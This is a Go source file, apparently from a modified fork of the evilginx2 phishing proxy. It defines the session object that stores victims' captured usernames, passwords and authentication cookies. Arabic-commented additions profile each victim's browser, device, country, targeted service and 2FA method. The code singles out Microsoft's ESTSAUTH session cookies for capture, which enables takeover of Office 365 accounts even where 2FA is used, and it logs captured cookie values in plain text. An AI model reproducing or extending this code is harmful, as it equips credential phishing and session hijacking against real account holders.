package core

import (
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
	
	// إضافة الحقول الجديدة
	CountryCode    string            // رمز البلد (مثل US, SA)
	CountryName    string            // اسم البلد الكامل
	DeviceType     string            // نوع الجهاز (موبايل، تابلت، سطح مكتب، إلخ)
	BrowserType    string            // نوع المتصفح (كروم، فايرفوكس، سفاري، إلخ)
	BrowserVersion string            // إصدار المتصفح
	OSType         string            // نوع نظام التشغيل (ويندوز، ماك، أندرويد، إلخ)
	OSVersion      string            // إصدار نظام التشغيل
	Has2FA         bool              // هل استخدم المصادقة الثنائية
	Type2FA        string            // نوع المصادقة الثنائية المستخدمة (SMS, App, Email, etc)
	LoginType      string            // نوع التسجيل (Office, GoDaddy, ADFS, etc)
	Extra          map[string]string // بيانات إضافية قد تكون مطلوبة لاحقاً
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
		
		// تهيئة الحقول الجديدة
		CountryCode:    "",
		CountryName:    "",
		DeviceType:     "",
		BrowserType:    "",
		BrowserVersion: "",
		OSType:         "",
		OSVersion:      "",
		Has2FA:         false,
		Type2FA:        "",
		LoginType:      "",
		Extra:          make(map[string]string),
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
	
	// محاولة تحديد نوع تسجيل الدخول بعد تعيين كلمة المرور
	if s.Username != "" {
		s.DetectLoginType()
	}
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, name string, value string, path string, httpOnly bool, expires time.Time) bool {
	domain = strings.ToLower(domain)
	
	// تسجيل المعلومات التشخيصية
	log.Debug("إضافة كوكي: %s = %s إلى المجال %s", name, value, domain)
	
	// تحقق من الكوكيز المهمة
	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
	for _, cookieName := range importantCookies {
		if strings.ToLower(name) == strings.ToLower(cookieName) {
			log.Success("تمت محاولة إضافة كوكي مهم: %s = %s (المجال: %s)", name, value, domain)
		}
	}
	
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}
	
	// الاحتفاظ بحالة الأحرف الأصلية للاسم
	originalName := name
	
	s.CookieTokens[domain][originalName] = &database.CookieToken{
		Name:     originalName,
		Value:    value,
		Path:     path,
		HttpOnly: httpOnly,
	}

	log.Success("تمت إضافة كوكي إلى الجلسة: %s=%s (المجال: %s)", originalName, value, domain)
	
	// تحقق من الإضافة
	if token, exists := s.CookieTokens[domain][originalName]; exists {
		log.Debug("تحقق من الإضافة: %s = %s", originalName, token.Value)
		return true
	} else {
		log.Error("فشل إضافة الكوكي %s: غير موجود بعد الإضافة!", originalName)
		return false
	}
}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}

// دوال جديدة للتعامل مع الحقول المضافة

// تعيين معلومات البلد
func (s *Session) SetCountry(code string, name string) {
	s.CountryCode = code
	s.CountryName = name
}

// تعيين معلومات الجهاز
func (s *Session) SetDeviceInfo(deviceType string, osType string, osVersion string) {
	s.DeviceType = deviceType
	s.OSType = osType
	s.OSVersion = osVersion
}

// تعيين معلومات المتصفح
func (s *Session) SetBrowserInfo(browserType string, browserVersion string) {
	s.BrowserType = browserType
	s.BrowserVersion = browserVersion
}

// تعيين معلومات المصادقة الثنائية
func (s *Session) Set2FAInfo(has2fa bool, type2fa string) {
	s.Has2FA = has2fa
	s.Type2FA = type2fa
}

// تعيين نوع التسجيل
func (s *Session) SetLoginType(loginType string) {
	s.LoginType = loginType
}

// إضافة معلومات إضافية في خريطة Extra
func (s *Session) AddExtraInfo(key string, value string) {
	s.Extra[key] = value
}

// ParseUserAgent يستخرج معلومات الجهاز والمتصفح من سلسلة User-Agent
func (s *Session) ParseUserAgent() {
	ua := s.UserAgent
	if ua == "" {
		return
	}
	
	// تحديد نوع المتصفح والإصدار
	switch {
	case strings.Contains(ua, "Chrome") && strings.Contains(ua, "Safari") && !strings.Contains(ua, "Edg") && !strings.Contains(ua, "OPR"):
		s.BrowserType = "Chrome"
		if idx := strings.Index(ua, "Chrome/"); idx != -1 {
			ver := ua[idx+7:]
			if endIdx := strings.Index(ver, " "); endIdx != -1 {
				s.BrowserVersion = ver[:endIdx]
			} else {
				s.BrowserVersion = ver
			}
		}
	case strings.Contains(ua, "Firefox"):
		s.BrowserType = "Firefox"
		if idx := strings.Index(ua, "Firefox/"); idx != -1 {
			s.BrowserVersion = ua[idx+8:]
		}
	case strings.Contains(ua, "Safari") && !strings.Contains(ua, "Chrome"):
		s.BrowserType = "Safari"
		if idx := strings.Index(ua, "Version/"); idx != -1 {
			ver := ua[idx+8:]
			if endIdx := strings.Index(ver, " "); endIdx != -1 {
				s.BrowserVersion = ver[:endIdx]
			}
		}
	case strings.Contains(ua, "Edg"):
		s.BrowserType = "Edge"
		if idx := strings.Index(ua, "Edg/"); idx != -1 {
			s.BrowserVersion = ua[idx+4:]
		}
	case strings.Contains(ua, "OPR") || strings.Contains(ua, "Opera"):
		s.BrowserType = "Opera"
		if idx := strings.Index(ua, "OPR/"); idx != -1 {
			s.BrowserVersion = ua[idx+4:]
		} else if idx := strings.Index(ua, "Opera/"); idx != -1 {
			s.BrowserVersion = ua[idx+6:]
		}
	case strings.Contains(ua, "MSIE") || strings.Contains(ua, "Trident"):
		s.BrowserType = "Internet Explorer"
		if idx := strings.Index(ua, "MSIE "); idx != -1 {
			ver := ua[idx+5:]
			if endIdx := strings.Index(ver, ";"); endIdx != -1 {
				s.BrowserVersion = strings.TrimSpace(ver[:endIdx])
			}
		} else if idx := strings.Index(ua, "rv:"); idx != -1 {
			ver := ua[idx+3:]
			if endIdx := strings.Index(ver, ")"); endIdx != -1 {
				s.BrowserVersion = ver[:endIdx]
			}
		}
	}
	
	// تحديد نظام التشغيل
	switch {
	case strings.Contains(ua, "Windows"):
		s.OSType = "Windows"
		if strings.Contains(ua, "Windows NT 10.0") {
			s.OSVersion = "10"
		} else if strings.Contains(ua, "Windows NT 6.3") {
			s.OSVersion = "8.1"
		} else if strings.Contains(ua, "Windows NT 6.2") {
			s.OSVersion = "8"
		} else if strings.Contains(ua, "Windows NT 6.1") {
			s.OSVersion = "7"
		} else if strings.Contains(ua, "Windows NT 6.0") {
			s.OSVersion = "Vista"
		} else if strings.Contains(ua, "Windows NT 5.1") {
			s.OSVersion = "XP"
		}
	case strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X"):
		s.OSType = "macOS"
		if idx := strings.Index(ua, "Mac OS X "); idx != -1 {
			ver := ua[idx+10:]
			if endIdx := strings.Index(ver, ")"); endIdx != -1 {
				s.OSVersion = strings.ReplaceAll(ver[:endIdx], "_", ".")
			}
		} else if idx := strings.Index(ua, "Mac OS X "); idx != -1 {
			ver := ua[idx+10:]
			if endIdx := strings.Index(ver, ";"); endIdx != -1 {
				s.OSVersion = strings.ReplaceAll(ver[:endIdx], "_", ".")
			}
		}
	case strings.Contains(ua, "Linux"):
		s.OSType = "Linux"
		if strings.Contains(ua, "Ubuntu") {
			s.OSVersion = "Ubuntu"
		} else if strings.Contains(ua, "Fedora") {
			s.OSVersion = "Fedora"
		}
	case strings.Contains(ua, "Android"):
		s.OSType = "Android"
		if idx := strings.Index(ua, "Android "); idx != -1 {
			ver := ua[idx+8:]
			if endIdx := strings.Index(ver, ";"); endIdx != -1 {
				s.OSVersion = ver[:endIdx]
			}
		}
	case strings.Contains(ua, "iOS") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") || strings.Contains(ua, "iPod"):
		s.OSType = "iOS"
		if idx := strings.Index(ua, "OS "); idx != -1 {
			ver := ua[idx+3:]
			if endIdx := strings.Index(ver, " "); endIdx != -1 {
				s.OSVersion = strings.ReplaceAll(ver[:endIdx], "_", ".")
			}
		}
	}
	
	// تحديد نوع الجهاز
	switch {
	case strings.Contains(ua, "iPhone"):
		s.DeviceType = "Mobile"
	case strings.Contains(ua, "iPad"):
		s.DeviceType = "Tablet"
	case strings.Contains(ua, "Android") && strings.Contains(ua, "Mobile"):
		s.DeviceType = "Mobile"
	case strings.Contains(ua, "Android") && !strings.Contains(ua, "Mobile"):
		s.DeviceType = "Tablet"
	default:
		if s.OSType == "Windows" || s.OSType == "macOS" || s.OSType == "Linux" {
			s.DeviceType = "Desktop"
		} else {
			s.DeviceType = "Unknown"
		}
	}
	
	log.Debug("معلومات المستخدم: المتصفح=%s %s | نظام التشغيل=%s %s | الجهاز=%s", 
		s.BrowserType, s.BrowserVersion, s.OSType, s.OSVersion, s.DeviceType)
}

// DetectLoginType تحديد نوع تسجيل الدخول (Office، GoDaddy، ADFS، إلخ) واكتشاف 2FA
func (s *Session) DetectLoginType() {
	// تحديد نوع التسجيل من اسم الـ phishlet أو البيانات المدخلة
	phishletName := strings.ToLower(s.Name)
	usernameStr := strings.ToLower(s.Username)
	
	// تحديد نوع الخدمة
	switch {
	case strings.Contains(phishletName, "office") || strings.Contains(phishletName, "microsoft") || 
	     strings.Contains(phishletName, "o365") || strings.Contains(phishletName, "outlook"):
		s.LoginType = "Office365"
		
	case strings.Contains(phishletName, "adfs") || strings.Contains(phishletName, "activedirectory"):
		s.LoginType = "ADFS"
		
	case strings.Contains(phishletName, "godaddy"):
		s.LoginType = "GoDaddy"
		
	case strings.Contains(phishletName, "google") || strings.Contains(phishletName, "gmail"):
		s.LoginType = "Google"
		
	case strings.Contains(phishletName, "facebook") || strings.Contains(phishletName, "fb"):
		s.LoginType = "Facebook"
		
	case strings.Contains(phishletName, "twitter"):
		s.LoginType = "Twitter"
		
	case strings.Contains(phishletName, "instagram"):
		s.LoginType = "Instagram"
		
	case strings.Contains(phishletName, "linkedin"):
		s.LoginType = "LinkedIn"
		
	case strings.Contains(phishletName, "github"):
		s.LoginType = "GitHub"
		
	default:
		// إذا لم يتم تحديد نوع الخدمة من اسم الـ phishlet، نحاول التخمين من اسم المستخدم
		if strings.HasSuffix(usernameStr, "microsoft.com") || 
		   strings.HasSuffix(usernameStr, "outlook.com") ||
		   strings.HasSuffix(usernameStr, "live.com") ||
		   strings.HasSuffix(usernameStr, "hotmail.com") {
			s.LoginType = "Office365"
		} else if strings.HasSuffix(usernameStr, "gmail.com") {
			s.LoginType = "Google"
		} else {
			s.LoginType = "Other"
		}
	}
	
	// اكتشاف استخدام المصادقة الثنائية (2FA)
	s.DetectTwoFactorAuth()
	
	log.Success("تم تحديد نوع تسجيل الدخول: %s (2FA: %t، نوع: %s)", 
		s.LoginType, s.Has2FA, s.Type2FA)
}

// DetectTwoFactorAuth محاولة اكتشاف ما إذا تم استخدام المصادقة الثنائية
func (s *Session) DetectTwoFactorAuth() {
	// مؤشرات المصادقة الثنائية المحتملة في بيانات الجلسة
	
	// فحص المعلمات الخاصة للبحث عن مؤشرات المصادقة الثنائية
	for key, value := range s.Custom {
		keyLower := strings.ToLower(key)
		valueLower := strings.ToLower(value)
		
		// كلمات تشير إلى المصادقة الثنائية
		if strings.Contains(keyLower, "2fa") || 
		   strings.Contains(keyLower, "otp") || 
		   strings.Contains(keyLower, "code") ||
		   strings.Contains(keyLower, "verify") ||
		   strings.Contains(keyLower, "factor") {
			s.Has2FA = true
		}
		
		// محاولة تحديد نوع المصادقة الثنائية
		if strings.Contains(valueLower, "sms") || strings.Contains(keyLower, "sms") || 
		   strings.Contains(keyLower, "phone") || strings.Contains(valueLower, "phone") {
			s.Type2FA = "SMS"
		} else if strings.Contains(valueLower, "app") || strings.Contains(keyLower, "app") || 
				  strings.Contains(valueLower, "authenticator") || strings.Contains(keyLower, "authenticator") {
			s.Type2FA = "App"
		} else if strings.Contains(valueLower, "email") || strings.Contains(keyLower, "email") {
			s.Type2FA = "Email"
		} else if s.Has2FA && s.Type2FA == "" {
			s.Type2FA = "Unknown"
		}
	}
	
	// إذا لم يتم اكتشاف المصادقة الثنائية من المعلمات، يمكن فحص الكوكيز أو معلومات أخرى
	if !s.Has2FA {
		// تحقق من وجود كوكيز خاصة بـ 2FA
		for domain, cookies := range s.CookieTokens {
			for name := range cookies {
				nameLower := strings.ToLower(name)
				if strings.Contains(nameLower, "2fa") || 
				   strings.Contains(nameLower, "twofa") || 
				   strings.Contains(nameLower, "factor") {
					s.Has2FA = true
					if s.Type2FA == "" {
						s.Type2FA = "Unknown"
					}
					break
				}
			}
			if s.Has2FA {
				break
			}
		}
	}
}

// ExtractCountryFromIP محاولة استخراج رمز البلد واسم البلد من عنوان IP
// ملاحظة: هذه الدالة تعتمد على خدمة خارجية ويمكن أن تفشل
func (s *Session) ExtractCountryFromIP() {
	if s.RemoteAddr == "" {
		return
	}
	
	// تجريد أي منفذ من العنوان (يأخذ فقط عنوان IP)
	ipStr := s.RemoteAddr
	if i := strings.LastIndex(ipStr, ":"); i != -1 {
		ipStr = ipStr[:i]
	}
	
	// التحقق من صحة عنوان IP
	if ipStr == "127.0.0.1" || ipStr == "::1" || ipStr == "localhost" {
		s.CountryCode = "LO"  // مؤشر للشبكة المحلية
		s.CountryName = "Local Network"
		return
	}
	
	// بدائية - تخمين رمز البلد من عنوان IP
	// في التطبيق الفعلي، يمكن استخدام خدمة مثل MaxMind GeoIP أو IP-API
	
	// في هذه النسخة البسيطة، نقوم بتخمين البلد من أول 3 أجزاء من IP
	// هذا ليس دقيقًا ومخصص فقط كمثال حتى يتم تنفيذ خدمة تحديد الموقع الجغرافي المناسبة
	s.CountryCode = "XX"
	s.CountryName = "Unknown"
	
	// إذا كان IP خاصًا
	if strings.HasPrefix(ipStr, "10.") || strings.HasPrefix(ipStr, "172.16.") || 
	   strings.HasPrefix(ipStr, "192.168.") {
		s.CountryCode = "LO"
		s.CountryName = "Local Network"
	}
	
	log.Debug("استخراج البلد من IP %s: %s (%s)", ipStr, s.CountryCode, s.CountryName)
	
	// ملاحظة: في التنفيذ الحقيقي، يمكن استخدام مكتبات مثل:
	// - https://github.com/oschwald/geoip2-golang
	// - أو إجراء طلب HTTP إلى خدمة مثل IP-API أو Abstract API
}
